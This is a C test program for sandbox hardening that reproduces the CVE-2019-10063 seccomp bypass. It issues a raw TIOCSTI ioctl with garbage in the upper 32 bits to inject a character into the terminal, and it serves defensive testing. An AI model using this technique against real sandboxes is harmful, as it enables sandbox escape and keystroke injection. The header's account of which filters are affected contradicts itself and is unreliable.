// =============================================================================
// CVE-2019-10063: seccomp ioctl bypass via 64-bit argument masking
// =============================================================================
//
// VULNERABILITY:
//   Some seccomp filters only checked the lower 32 bits of ioctl commands.
//   By placing arbitrary data in the upper 32 bits, attackers could bypass
//   filters while the kernel would still process the lower 32 bits as the
//   actual command.
//
// IMPACT:
//   - Bypass seccomp ioctl filtering
//   - Execute blocked ioctls like TIOCSTI
//   - Sandbox escape via terminal injection
//
// AFFECTED SOFTWARE:
//   - Flatpak < 1.0.8 / 1.2.4 / 1.3.2
//   - Any seccomp filter checking full 64-bit argument
//
// ATTACK VECTOR:
//   1. Construct ioctl command with garbage in upper 32 bits
//   2. Call syscall(__NR_ioctl, fd, masked_cmd, arg)
//   3. Weak filter sees 0x0000XXXX00005412, doesn't match TIOCSTI
//   4. Kernel processes only lower 32 bits (0x5412 = TIOCSTI)
//
// WHY THIS PAYLOAD:
//   This tests that the seccomp filter correctly handles 64-bit ioctl
//   arguments. A proper filter loads only 32 bits (BPF_W), which naturally
//   ignores the upper bits. This payload verifies that protection.
//
// EXPECTED RESULT:
//   Sandbox should block this even with upper bits set (SIGSYS).
//   If the filter is vulnerable, TIOCSTI would succeed.
//
// REFERENCES:
//   - https://github.com/flatpak/flatpak/security/advisories/GHSA-6qcp-mh39-cp53
//   - https://github.com/containers/bubblewrap/blob/main/tests/try-syscall.c
//
// =============================================================================

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>

#define TIOCSTI 0x5412

int main(void) {
    int tty_fd = open("/dev/tty", O_RDWR);
    if (tty_fd < 0) {
        // No TTY - sandbox properly isolated
        return 1;
    }

    // CVE-2019-10063 bypass technique:
    // Put garbage in upper 32 bits to confuse weak seccomp filters
    unsigned long not_TIOCSTI = (0xDEADBEEFUL << 32) | TIOCSTI;
    //                          ^^^^^^^^^^^^^^^^       ^^^^^^^
    //                          Upper 32 bits          Lower 32 bits (actual cmd)

    char c = '#';

    // Use raw syscall to pass the full 64-bit value
    // Kernel ignores upper 32 bits, but weak filters might not
    long ret = syscall(__NR_ioctl, tty_fd, not_TIOCSTI, &c);

    close(tty_fd);

    if (ret == 0) {
        // Bypass worked - filter is vulnerable!
        return 0;
    }

    // Blocked (expected secure behavior)
    // Either seccomp killed us (SIGSYS) or ioctl returned error
    return 1;
}
